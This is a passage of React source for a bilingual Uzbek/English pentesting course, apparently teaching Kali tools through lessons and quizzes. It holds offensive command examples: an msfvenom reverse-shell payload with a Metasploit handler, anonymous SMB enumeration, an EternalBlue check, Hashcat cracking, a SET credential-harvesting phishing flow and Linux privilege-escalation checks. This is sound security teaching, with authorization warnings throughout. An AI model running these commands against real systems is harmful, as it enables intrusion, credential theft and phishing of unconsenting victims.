    React.createElement(Quiz,{q:{uz:"theHarvester qanday razvedka turiga misol?",en:"What type of recon is theHarvester?"},opts:[{uz:"Aktiv (nishonga hujum)",en:"Active (probing the target)"},{uz:"Passiv (ochiq manba OSINT)",en:"Passive (open-source OSINT)"},{uz:"Ekspluatatsiya",en:"Exploitation"},{uz:"Post-ekspluatatsiya",en:"Post-exploitation"}],correct:1,exp:{uz:"theHarvester passiv OSINT vositasi — u ma'lumotni uchinchi tomon ochiq manbalaridan oladi va nishonga hech narsa yubormaydi.",en:"theHarvester is a passive OSINT tool — it pulls data from third-party public sources and sends nothing to the target."}}));
}
function LessonL17(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"WhatWeb nima?","What is WhatWeb?")),
    React.createElement(P,null,t(lang,"WhatWeb — veb-saytning \"ostida\" qanday texnologiyalar ishlayotganini aniqlaydigan vosita. U CMS (WordPress, Joomla), veb-server (Apache, Nginx), dasturlash tili, JavaScript kutubxonalari, analitika vositalari va hatto aniq versiyalarni ham topadi. Bu zaifliklarni izlashning boshlanish nuqtasi: qanday texnologiya ishlatilishini bilib, unga tegishli ma'lum zaifliklarni qidirasiz.","WhatWeb identifies which technologies run \"under the hood\" of a website. It detects the CMS (WordPress, Joomla), web server (Apache, Nginx), programming language, JavaScript libraries, analytics tools and even exact versions. This is the starting point for finding vulnerabilities: knowing what technology is used, you look up known vulnerabilities for it.")),
    React.createElement(H2,{num:"§2"},t(lang,"Nima aniqlanadi","What it detects")),
    React.createElement(LayerStack,{layers:[
      {n:"🧩",name:"CMS",color:"#a855f7",desc:{uz:"WordPress, Joomla, Drupal + versiya.",en:"WordPress, Joomla, Drupal + version."}},
      {n:"🖥",name:t(lang,"Veb-server","Web server"),color:"#4dabf7",desc:{uz:"Apache, Nginx, IIS + versiya.",en:"Apache, Nginx, IIS + version."}},
      {n:"⚙",name:t(lang,"Til/framework","Language/framework"),color:"#69db7c",desc:{uz:"PHP, ASP.NET, Node, Django.",en:"PHP, ASP.NET, Node, Django."}},
      {n:"📊",name:t(lang,"Kutubxona/analitika","Library/analytics"),color:"#ffd43b",desc:{uz:"jQuery, Bootstrap, Google Analytics.",en:"jQuery, Bootstrap, Google Analytics."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"U qanday aniqlaydi?","How it detects")),
    React.createElement(P,null,t(lang,"WhatWeb saytdan olingan HTTP javobini tahlil qiladi: sarlavhalar (Server:, X-Powered-By:), sahifa HTML kodidagi imzolar (meta teglar, JS fayl nomlari, muayyan yo'llar) va cookie nomlari. Har texnologiyaning o'ziga xos \"barmoq izi\" bor — masalan WordPress /wp-content/ yo'lini, Drupal esa maxsus meta tegni ishlatadi. WhatWeb minglab shunday imzoni biladi.","WhatWeb analyzes the HTTP response from the site: headers (Server:, X-Powered-By:), signatures in the page HTML (meta tags, JS file names, specific paths) and cookie names. Each technology has its own \"fingerprint\" — for example WordPress uses the /wp-content/ path, Drupal a specific meta tag. WhatWeb knows thousands of such signatures.")),
    React.createElement(H2,{num:"§4"},t(lang,"Agressivlik va keyingi qadam","Aggression and the next step")),
    React.createElement(P,null,t(lang,"-a bayrog'i agressivlik darajasini belgilaydi: -a 1 (yashirin, faqat asosiy sahifa), -a 3 (o'rtacha, ko'proq so'rov) va -a 4 (agressiv, eng aniq). Yuqori daraja ko'proq aniqlaydi, lekin ko'proq iz qoldiradi. Muhimi — keyingi qadam: agar WhatWeb \"WordPress 5.2\" ni aniqlasa, siz darhol searchsploit wordpress 5.2 bilan o'sha versiyaga tegishli ma'lum zaifliklarni izlaysiz. Texnologiya + versiya = maqsadli hujum.","The -a flag sets the aggression level: -a 1 (stealthy, main page only), -a 3 (moderate, more requests), -a 4 (aggressive, most accurate). Higher levels detect more but leave more trace. The key is the next step: if WhatWeb detects \"WordPress 5.2\", you immediately look up known vulnerabilities for that version with searchsploit wordpress 5.2. Technology + version = a targeted attack.")),
    React.createElement(Terminal,null,"whatweb example.com\nwhatweb -v example.com          # batafsil\nwhatweb -a 3 example.com        # agressivlik darajasi\nwhatweb -i targets.txt          # ko'p saytni birdan"),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"\"WordPress 5.2\" aniqlansa — searchsploit wordpress 5.2 bilan ma'lum zaifliklarni izlaysiz. Texnologiya + versiya = maqsadli hujum.","If it detects \"WordPress 5.2\" — you look up known vulns with searchsploit wordpress 5.2. Technology + version = a targeted attack.")),
    React.createElement(Quiz,{q:{uz:"WhatWeb asosan nimani aniqlaydi?",en:"What does WhatWeb primarily identify?"},opts:[{uz:"Parol hashlarini",en:"Password hashes"},{uz:"Veb-saytning texnologiya stekini",en:"A website's technology stack"},{uz:"Ochiq UDP portlarni",en:"Open UDP ports"},{uz:"WiFi parollarini",en:"WiFi passwords"}],correct:1,exp:{uz:"WhatWeb veb-sayt ortidagi texnologiyalarni (CMS, server, til, kutubxonalar va versiyalar) aniqlaydi — maqsadli zaiflik izlash uchun asos.",en:"WhatWeb detects the technologies behind a website (CMS, server, language, libraries and versions) — a basis for targeted vulnerability research."}}));
}
function LessonL18(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"enum4linux nima?","What is enum4linux?")),
    React.createElement(P,null,t(lang,"enum4linux — Windows va Samba tizimlaridan SMB protokoli orqali ma'lumot to'playdigan vosita. U foydalanuvchilar ro'yxati, guruhlar, ulashilgan papkalar (shares), parol siyosati va operatsion tizim ma'lumotlarini chiqarib olishga urinadi — va ko'pincha buni autentifikatsiyasiz, ya'ni \"null session\" orqali qiladi. Bu Windows tarmoqlariga qarshi eng ko'p ishlatiladigan enumeratsiya vositalaridan biri.","enum4linux gathers information from Windows and Samba systems over the SMB protocol. It attempts to extract the user list, groups, shared folders (shares), password policy and OS details — and often does so without authentication, via a \"null session\". It's one of the most-used enumeration tools against Windows networks.")),
    React.createElement(H2,{num:"§2"},t(lang,"Enumeratsiya oqimi","Enumeration flow")),
    React.createElement(FlowSteps,{title:{uz:"enum4linux",en:"enum4linux"},steps:[
      {icon:"🔌",text:{uz:"SMB'ga null session bilan ulanish (parolsiz)",en:"Connect to SMB with a null session (no password)"}},
      {icon:"👥",text:{uz:"Foydalanuvchilar va guruhlarni sanash",en:"Enumerate users and groups"}},
      {icon:"📂",text:{uz:"Ulashilgan papkalarni ro'yxatlash",en:"List shared folders"}},
      {icon:"📋",text:{uz:"OS va parol siyosati ma'lumoti",en:"OS and password-policy info"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"\"Null session\" nima?","What is a null session?")),
    React.createElement(P,null,t(lang,"Null session — bu foydalanuvchi nomi va parolsiz SMB'ga anonim ulanish. Eski yoki noto'g'ri sozlangan Windows tizimlari null session'ga ruxsat beradi, va bu butun foydalanuvchilar ro'yxatini, guruhlarni va parol siyosatini ochib berishi mumkin. Nega bu xavfli? Chunki foydalanuvchi ismlari ro'yxati — parol hujumlari uchun yarim yo'l: endi hujumchi faqat parolni topsa kifoya. Shuning uchun zamonaviy Windows null session'ni cheklaydi.","A null session is an anonymous connection to SMB with no username or password. Old or misconfigured Windows systems allow null sessions, which can leak the entire user list, groups and password policy. Why is that dangerous? Because a list of usernames is half the way to a password attack: now the attacker only needs to find the password. That's why modern Windows restricts null sessions.")),
    React.createElement(H2,{num:"§4"},t(lang,"Nima chiqariladi va ng versiya","What it extracts and the ng version")),
    React.createElement(P,null,t(lang,"-a bayrog'i barcha tekshiruvlarni ishga tushiradi: foydalanuvchilar (RID cycling orqali ham), guruhlar, ulashmalar, parol siyosati, va operatsion tizim versiyasi. Zamonaviy muqobil — enum4linux-ng (Python bilan qayta yozilgan, tezroq va tuzilgan chiqish beradi). enum4linux 139 va 445 portlar (SMB) ochiq bo'lganda ishlaydi — ular Nmap bilan avval aniqlanadi.","The -a flag runs all checks: users (including via RID cycling), groups, shares, password policy and OS version. The modern alternative is enum4linux-ng (rewritten in Python, faster and with structured output). enum4linux works when ports 139 and 445 (SMB) are open — which you first find with Nmap.")),
    React.createElement(Terminal,null,"enum4linux -a 10.0.0.5           # to'liq\nenum4linux -U 10.0.0.5           # faqat foydalanuvchilar\nenum4linux -S 10.0.0.5           # faqat ulashmalar\nenum4linux-ng -A 10.0.0.5        # zamonaviy versiya"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"enum4linux topilgan foydalanuvchi ismlarini keyinchalik parol hujumlari uchun ishlatish mumkin — faqat ruxsat berilgan nishonlarda.","Usernames enum4linux finds may be used in later password attacks — only on authorized targets.")),
    React.createElement(Quiz,{q:{uz:"enum4linux qaysi protokol orqali ma'lumot to'playdi?",en:"Over which protocol does enum4linux gather info?"},opts:[{uz:"SMB",en:"SMB"},{uz:"DNS",en:"DNS"},{uz:"SMTP",en:"SMTP"},{uz:"SNMP",en:"SNMP"}],correct:0,exp:{uz:"enum4linux SMB protokoli (139/445 portlar) orqali Windows/Samba tizimlaridan foydalanuvchilar, guruhlar va ulashmalarni sanaydi.",en:"enum4linux uses the SMB protocol (ports 139/445) to enumerate users, groups and shares from Windows/Samba systems."}}));
}
function LessonL19(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"SMB va nima uchun muhim","SMB and why it matters")),
    React.createElement(P,null,t(lang,"SMB (Server Message Block) — Windows tarmoqlarida fayl va printerlarni ulashish protokoli. U 445-portda ishlaydi va korporativ tarmoqlarda deyarli hamma joyda uchraydi. Pentester uchun SMB oltin kon: noto'g'ri sozlangan ulashmalar (shares) maxfiy fayllar, parollar, konfiguratsiya va zaxira nusxalarini ochib berishi mumkin — ko'pincha shunchaki ulanish orqali.","SMB (Server Message Block) is the file and printer sharing protocol in Windows networks. It runs on port 445 and is nearly everywhere in corporate networks. For a pentester SMB is a goldmine: misconfigured shares can expose confidential files, passwords, configuration and backups — often just by connecting.")),
    React.createElement(H2,{num:"§2"},t(lang,"Ulashmalarni sanash","Enumerating shares")),
    React.createElement(FlowSteps,{title:{uz:"SMB ulashmalari",en:"SMB shares"},steps:[
      {icon:"📋",text:{uz:"smbclient -L bilan ulashmalar ro'yxati",en:"List shares with smbclient -L"}},
      {icon:"🗺",text:{uz:"smbmap bilan ruxsatlarni xaritalash",en:"Map permissions with smbmap"}},
      {icon:"📂",text:{uz:"Ulashmaga ulanib fayllarni ko'rish",en:"Connect and browse files"}},
      {icon:"⬇",text:{uz:"Qiziqarli fayllarni yuklab olish (get)",en:"Download interesting files (get)"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Asosiy vositalar","The core tools")),
    React.createElement(P,null,t(lang,"Bir necha vosita SMB bilan ishlaydi. smbclient — FTP kabi interaktiv, ulashmaga ulanib ls, get, put bajarasiz. smbmap — barcha ulashmalarni va ularga bo'lgan ruxsatlaringizni (READ/WRITE) tez ko'rsatadi. crackmapexec (yoki yangi nxc) — ko'p xostda birdan SMB ni tekshiradi, ma'lumotlarni sanaydi va hatto ma'lumotnomalar bilan kirishni sinaydi. Nmap NSE skriptlari (smb-enum-shares) ham foydali.","Several tools work with SMB. smbclient — interactive like FTP, you connect to a share and run ls, get, put. smbmap — quickly shows all shares and your permissions on them (READ/WRITE). crackmapexec (or the newer nxc) — checks SMB across many hosts at once, enumerates data and even tests logins with credentials. Nmap NSE scripts (smb-enum-shares) are useful too.")),
    React.createElement(H2,{num:"§4"},t(lang,"EternalBlue va SMB zaifliklari","EternalBlue and SMB vulnerabilities")),
    React.createElement(P,null,t(lang,"SMB tarixdagi eng mashhur zaifliklardan biriga ega — MS17-010, ya'ni EternalBlue. Bu eski SMBv1'dagi kamchilik bo'lib, hujumchiga masofadan kod bajarishga (tizimni to'liq egallashga) imkon beradi — WannaCry ransomware aynan shuni ishlatgan. Ajablanarlisi, u hali ham ko'p eski, yangilanmagan tizimlarda ochiq. Nmap skripti bilan tekshirib ko'rish mumkin.","SMB has one of the most famous vulnerabilities in history — MS17-010, aka EternalBlue. It's a flaw in the old SMBv1 that lets an attacker execute code remotely (fully take over the system) — the WannaCry ransomware used exactly this. Remarkably, it's still open on many old, unpatched systems. You can check for it with an Nmap script.")),
    React.createElement(Terminal,null,"smbclient -L //10.0.0.5 -N        # anonim ulashmalar ro'yxati\nsmbmap -H 10.0.0.5                 # ruxsatlarni xaritalash\nsmbclient //10.0.0.5/Documents -N # ulashmaga ulanish\nnmap --script smb-vuln-ms17-010 -p445 10.0.0.5  # EternalBlue"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"SMB enumeratsiyani faqat sizga tegishli yoki yozma ruxsat berilgan tizimlarda o'tkazing.","Only perform SMB enumeration on systems you own or are authorized to test.")),
    React.createElement(Quiz,{q:{uz:"SMB protokoli qaysi asosiy portda ishlaydi?",en:"On which main port does SMB run?"},opts:[{uz:"22",en:"22"},{uz:"80",en:"80"},{uz:"445",en:"445"},{uz:"53",en:"53"}],correct:2,exp:{uz:"SMB asosan 445-portda (eski hollarda 139) ishlaydi va Windows tarmoqlarida fayl ulashish uchun ishlatiladi.",en:"SMB runs mainly on port 445 (139 in legacy cases) and is used for file sharing in Windows networks."}}));
}
function LessonL22(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"msfvenom nima?","What is msfvenom?")),
    React.createElement(P,null,t(lang,"msfvenom — Metasploit tarkibidagi payload generatori. Turli formatlarda (.exe, .elf, .apk) bajariladigan yuklarni yaratadi. Nishonda ishga tushganda hujumchiga teskari ulanish (reverse shell) beradi. Faqat ta'lim uchun.","msfvenom is the payload generator inside Metasploit. It creates executable payloads in various formats (.exe, .elf, .apk). When run on a target it gives the attacker a reverse shell. For education only.")),
    React.createElement(H2,{num:"§2"},t(lang,"Payload → shell oqimi","Payload → shell flow")),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"msfvenom + handler",en:"msfvenom + handler"},steps:[
      {icon:"🧪",text:{uz:"msfvenom bilan payload yaratish (LHOST/LPORT)",en:"Generate a payload with msfvenom (LHOST/LPORT)"}},
      {icon:"👂",text:{uz:"Metasploit'da handler (tinglovchi) sozlash",en:"Set up a handler (listener) in Metasploit"}},
      {icon:"▶",text:{uz:"Nishonda payload ishga tushadi",en:"The payload runs on the target"}},
      {icon:"🔗",text:{uz:"Teskari ulanish hujumchiga qaytadi",en:"A reverse connection returns to the attacker"}},
      {icon:"🐚",text:{uz:"Meterpreter/shell sessiyasi ochiladi",en:"A Meterpreter/shell session opens"}},
    ]}),
    React.createElement(Terminal,null,"msfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=10.0.0.10 LPORT=4444 -f exe -o shell.exe\n\n# handler:\nuse exploit/multi/handler\nset LHOST 10.0.0.10\nrun"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"LHOST — sizning (hujumchi) IP, LPORT — tinglayotgan port. Bunday yuklarni faqat laboratoriya yoki ruxsat berilgan nishonlarda sinang.","LHOST is your (attacker) IP, LPORT the listening port. Only test such payloads in a lab or on authorized targets.")),
    React.createElement(Quiz,{q:{uz:"msfvenom da LHOST nimani bildiradi?",en:"In msfvenom, what does LHOST specify?"},opts:[{uz:"Nishonning IP si",en:"The target's IP"},{uz:"Hujumchining (tinglovchining) IP si",en:"The attacker's (listener's) IP"},{uz:"Fayl nomi",en:"A file name"},{uz:"Payload turi",en:"The payload type"}],correct:1,exp:{uz:"LHOST — teskari ulanish qaytadigan manzil, ya'ni hujumchining IP si.",en:"LHOST is where the reverse connection returns — the attacker's IP."}}));
}function LessonL23(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"searchsploit va Exploit-DB","searchsploit and Exploit-DB")),
    React.createElement(P,null,t(lang,"Exploit-DB — dunyodagi eng katta ochiq ekspluatatsiya arxivi. searchsploit uning nusxasini Kali'da oflayn qidirish imkonini beradi. Nishon dasturi va versiyasini bilgach, unga mos tayyor ekspluatatsiyani topasiz.","Exploit-DB is the world's largest public exploit archive. searchsploit searches a local copy offline in Kali. Once you know the target's software and version, you find a matching ready-made exploit.")),
    React.createElement(H2,{num:"§2"},t(lang,"Topish oqimi","The find flow")),
    React.createElement(FlowSteps,{title:{uz:"Ekspluatatsiyani topish",en:"Finding an exploit"},steps:[
      {icon:"🔎",text:{uz:"searchsploit apache 2.4 — nom+versiya bo'yicha qidirish",en:"searchsploit apache 2.4 — search by name+version"}},
      {icon:"👁",text:{uz:"searchsploit -x ... — kodni o'qish",en:"searchsploit -x ... — read the code"}},
      {icon:"📋",text:{uz:"searchsploit -m ... — joriy katalogga nusxalash",en:"searchsploit -m ... — copy to the current folder"}},
      {icon:"🔧",text:{uz:"Kodni sozlab, ehtiyotkorlik bilan ishga tushirish",en:"Tune the code and run it carefully"}},
    ]}),
    React.createElement(Terminal,null,"searchsploit wordpress 5.2\nsearchsploit -x php/webapps/50123.php   # o'qish\nsearchsploit -m 50123                   # nusxalash"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Internetdan olingan ekspluatatsiya kodini ko'r-ko'rona ishga tushirmang — avval o'qib, nima qilishini tushuning.","Never blindly run exploit code from the internet — read it first and understand what it does.")),
    React.createElement(Quiz,{q:{uz:"searchsploit asosan nima uchun ishlatiladi?",en:"What is searchsploit mainly used for?"},opts:[{uz:"Portlarni skanerlash",en:"Scanning ports"},{uz:"Ma'lum dastur/versiyaga tayyor ekspluatatsiyalarni topish",en:"Finding ready exploits for a known software/version"},{uz:"Parollarni buzish",en:"Cracking passwords"},{uz:"Trafikni tinglash",en:"Sniffing traffic"}],correct:1,exp:{uz:"searchsploit Exploit-DB lokal nusxasidan ma'lum dastur/versiyaga mos ekspluatatsiyalarni oflayn qidiradi.",en:"searchsploit searches a local Exploit-DB offline for exploits matching a known software/version."}}));
}function LessonL26(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Hashcat nima?","What is Hashcat?")),
    React.createElement(P,null,t(lang,"Hashcat — dunyodagi eng tezkor parol hash buzuvchi. GPU quvvatidan foydalanib sekundiga milliardlab parolni sinaydi. John kabi oflayn, lekin katta ishlar uchun ancha tezroq.","Hashcat is the world's fastest password-hash cracker. Using GPU power, it tries billions of passwords per second. Like John it's offline, but far faster for large jobs.")),
    React.createElement(H2,{num:"§2"},t(lang,"Hujum rejimlari","Attack modes")),
    React.createElement(LayerStack,{layers:[
      {n:"-a 0",name:t(lang,"Lug'at","Dictionary"),color:"#69db7c",desc:{uz:"Wordlist bilan (rockyou.txt).",en:"With a wordlist (rockyou.txt)."}},
      {n:"-a 3",name:t(lang,"Brute-force (maska)","Brute-force (mask)"),color:"#ff3a5e",desc:{uz:"?a?a?a... belgilar kombinatsiyasi.",en:"?a?a?a... character combinations."}},
      {n:"-a 6",name:t(lang,"Wordlist + maska","Wordlist + mask"),color:"#4dabf7",desc:{uz:"Lug'at so'ziga qo'shimchalar.",en:"Suffixes appended to wordlist words."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Foydalanish","Usage")),
    React.createElement(Terminal,null,"hashcat -m 0 -a 0 hashes.txt rockyou.txt    # MD5\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt   # NTLM\nhashcat -m 0 hashes.txt --show"),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"To'g'ri -m (hash turi) qiymatini tanlash muhim. hashid vositasi hash turini aniqlashga yordam beradi.","Choosing the right -m (hash type) matters. The hashid tool helps identify the hash type.")),
    React.createElement(Quiz,{q:{uz:"Hashcat ning John dan asosiy farqi nimada?",en:"Hashcat's main difference from John?"},opts:[{uz:"U onlayn ishlaydi",en:"It works online"},{uz:"U GPU'dan foydalanib ancha tezroq",en:"It uses the GPU and is much faster"},{uz:"U faqat MD5 buzadi",en:"It only cracks MD5"},{uz:"U parol yaratadi",en:"It creates passwords"}],correct:1,exp:{uz:"Hashcat GPU'dan foydalanib sekundiga milliardlab parolni sinaydi — katta ishlar uchun John'dan tezroq. Ikkalasi oflayn.",en:"Hashcat leverages the GPU for billions of tries per second — faster than John for big jobs. Both offline."}}));
}function LessonL28(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Ijtimoiy muhandislik va SET","Social engineering and SET")),
    React.createElement(P,null,t(lang,"Ijtimoiy muhandislik — texnik zaifliklar emas, insonlarni aldash orqali hujum. Eng kuchli himoya ham bitta ishonuvchan xodim tufayli buziladi. SET (Social-Engineer Toolkit) — bunday stsenariylarni yaratish uchun Kali vositasi.","Social engineering attacks by deceiving people rather than exploiting technical flaws. Even the strongest defense breaks because of one trusting employee. SET (Social-Engineer Toolkit) builds such scenarios in Kali.")),
    React.createElement(H2,{num:"§2"},t(lang,"Phishing oqimi (misol)","Phishing flow (example)")),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"Credential harvesting",en:"Credential harvesting"},steps:[
      {icon:"🎭",text:{uz:"Haqiqiy login sahifasining soxta nusxasi klonlanadi",en:"A fake clone of a real login page is created"}},
      {icon:"📧",text:{uz:"Qurbonga ishonchli ko'rinuvchi havola yuboriladi",en:"A believable link is sent to the victim"}},
      {icon:"⌨",text:{uz:"Qurbon login/parolni soxta sahifaga kiritadi",en:"The victim enters credentials on the fake page"}},
      {icon:"🕳",text:{uz:"Ma'lumot hujumchiga yuboriladi (harvest)",en:"The data is sent to the attacker (harvested)"}},
    ]}),
    React.createElement(Terminal,null,"sudo setoolkit\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester Method"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Ijtimoiy muhandislik hujumlari faqat rasmiy, yozma ruxsat berilgan pentest doirasida o'tkazilishi mumkin. Aks holda bu firibgarlik va jinoyat.","Social engineering attacks may only be run within a formal, written-authorized pentest. Otherwise it is fraud and a crime.")),
    React.createElement(Quiz,{q:{uz:"Ijtimoiy muhandislik nimaga asoslanadi?",en:"What does social engineering rely on?"},opts:[{uz:"Dasturiy zaifliklarga",en:"Software vulnerabilities"},{uz:"Insonlarni aldash va ishonchdan foydalanishga",en:"Deceiving people and abusing trust"},{uz:"Tarmoq portlariga",en:"Network ports"},{uz:"Shifrlash xatolariga",en:"Encryption flaws"}],correct:1,exp:{uz:"Ijtimoiy muhandislik insoniy omilga qaratilgan — odamlarni aldab maxfiy ma'lumot yoki kirish berishga undaydi.",en:"Social engineering targets the human factor — tricking people into handing over secrets or access."}}));
}function LessonL29(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Imtiyozlarni oshirish nima?","What is privilege escalation?")),
    React.createElement(P,null,t(lang,"Imtiyozlarni oshirish (privesc) — tizimga oddiy foydalanuvchi sifatida kirgach, root (Linux) yoki Administrator huquqlarini qo'lga kiritish. Ko'p hujumlar past imtiyozli kirish bilan boshlanadi; privesc to'liq nazoratni beradi.","Privilege escalation (privesc) is gaining root (Linux) or Administrator rights after entering as a normal user. Many attacks start with low-privilege access; privesc gives full control.")),
    React.createElement(H2,{num:"§2"},t(lang,"Linux privesc tekshiruvi","Linux privesc checks"),),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"Privesc yo'lini izlash",en:"Hunting a privesc path"},steps:[
      {icon:"🔑",text:{uz:"sudo -l — qanday sudo huquqim bor?",en:"sudo -l — what sudo rights do I have?"}},
      {icon:"🎫",text:{uz:"SUID fayllarni topish (GTFOBins bilan solishtirish)",en:"Find SUID files (compare with GTFOBins)"}},
      {icon:"⏱",text:{uz:"Yozish mumkin cron ishlari va kernel versiyasi",en:"Writable cron jobs and the kernel version"}},
      {icon:"🤖",text:{uz:"LinPEAS bilan avtomatik tekshirish",en:"Automate the checks with LinPEAS"}},
    ]}),
    React.createElement(Terminal,null,"sudo -l\nfind / -perm -4000 -type f 2>/dev/null\nuname -a\n./linpeas.sh"),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"GTFOBins (gtfobins.github.io) — SUID/sudo huquqli oddiy dasturlarni (vim, find) qanday qilib root olishga aylantirishni ko'rsatadi.","GTFOBins (gtfobins.github.io) shows how ordinary programs (vim, find) with SUID/sudo can be turned into root.")),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Privesc texnikalarini faqat o'z laboratoriyangizda yoki ruxsat berilgan pentestda sinang.","Only test privesc techniques in your own lab or an authorized pentest.")),
    React.createElement(Quiz,{q:{uz:"Linux privescning eng birinchi tekshiruvi qaysi?",en:"One of the very first Linux privesc checks?"},opts:[{uz:"sudo -l bilan sudo huquqlarini ko'rish",en:"Checking sudo rights with sudo -l"},{uz:"Kompyuterni o'chirish",en:"Shutting down the computer"},{uz:"Brauzerni ochish",en:"Opening a browser"},{uz:"Fonni o'zgartirish",en:"Changing the wallpaper"}],correct:0,exp:{uz:"sudo -l joriy foydalanuvchiga qanday sudo huquqlari berilganini ko'rsatadi — ko'pincha root'ga tez yo'l.",en:"sudo -l shows the current user's sudo rights — often a quick path to root."}}));
}function LessonL30(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Pentestning yakuniy bosqichi","The final phase of a pentest")),
    React.createElement(P,null,t(lang,"Haqiqiy hujumchilar izlarini yashiradi, lekin professional pentesterning eng muhim mahsuloti — hisobot. Topilmalaringiz tushunarli, takrorlanadigan va tuzatib bo'ladigan tarzda hujjatlashtirilmasa, butun ish qiymatini yo'qotadi.","Real attackers cover their tracks, but a professional pentester's most important deliverable is the report. If findings aren't documented in a clear, reproducible and fixable way, the whole engagement loses value.")),
    React.createElement(H2,{num:"§2"},t(lang,"Professional hisobot tuzilishi","Professional report structure")),
    React.createElement(FlowSteps,{color:"#69db7c",title:{uz:"Hisobot bosqichlari",en:"Report stages"},steps:[
      {icon:"📄",text:{uz:"Executive Summary — rahbariyat uchun texnik bo'lmagan xulosa",en:"Executive Summary — non-technical summary for management"}},
      {icon:"🎯",text:{uz:"Scope & Methodology — nima va qanday test qilingani",en:"Scope & Methodology — what was tested and how"}},
      {icon:"🐞",text:{uz:"Findings — har zaiflik: tavsif, jiddiylik (CVSS), isbot",en:"Findings — each vuln: description, severity (CVSS), proof"}},
      {icon:"🛠",text:{uz:"Remediation — qanday tuzatish bo'yicha tavsiyalar",en:"Remediation — how-to-fix recommendations"}},
    ]}),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"Isbot (PoC): har topilma skrinshot, buyruq va qadamlar bilan hujjatlashtirilishi kerak — mijoz uni takrorlab, tuzatgach sinab ko'ra olsin. Hisobotsiz pentest — tugallanmagan pentest.","Proof (PoC): each finding should be documented with screenshots, commands and steps so the client can reproduce, fix, then retest. A pentest without a report is unfinished.")),
    React.createElement(Quiz,{q:{uz:"Professional pentesterning eng muhim yakuniy mahsuloti nima?",en:"A professional pentester's most important final deliverable?"},opts:[{uz:"Buzilgan tizimlar soni",en:"The number of systems breached"},{uz:"Aniq, takrorlanadigan va tuzatib bo'ladigan hisobot",en:"A clear, reproducible and fixable report"},{uz:"O'g'irlangan parollar",en:"Stolen passwords"},{uz:"Tozalangan loglar",en:"Cleared logs"}],correct:1,exp:{uz:"Pentestning qiymati hisobotda — topilmalar tushunarli, isbotlangan va tuzatish tavsiyalari bilan hujjatlanishi shart.",en:"The value of a pentest is in the report — findings must be documented clearly, with proof and remediation."}}));
}const root=ReactDOM.createRoot(document.getElementById("app"));
root.render(React.createElement(App));

/* ── Animated background particles (matches Windows module) ── */
(function(){
  function initBgParticles(){
    var el=document.getElementById("bg-root");
    if(!el) return;
    el.className="bg-stage bg-grid bg-scan";
    [].slice.call(el.querySelectorAll(".particle")).forEach(function(p){p.remove();});
    var count=30;
    for(var i=0;i<count;i++){
      var p=document.createElement("div");
      var isStar=i%5===0;
      p.className="particle"+(isStar?" particle-star":"");
      var s=isStar?3+Math.random()*3:1+Math.random()*2;
      p.style.width=p.style.height=s+"px";
      p.style.left=(Math.random()*100)+"%";
      p.style.top=(Math.random()*100)+"%";
      var angle=Math.random()*Math.PI*2;
      var dist=120+Math.random()*220;
      p.style.setProperty("--dx",(Math.cos(angle)*dist)+"px");
      p.style.setProperty("--dy",(Math.sin(angle)*dist-80)+"px");
      p.style.animationDuration=(isStar?20:12+Math.random()*20)+"s";
      p.style.animationDelay=(-Math.random()*35)+"s";
      el.appendChild(p);
    }
  }
  if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",initBgParticles);}
  else{initBgParticles();}
})();
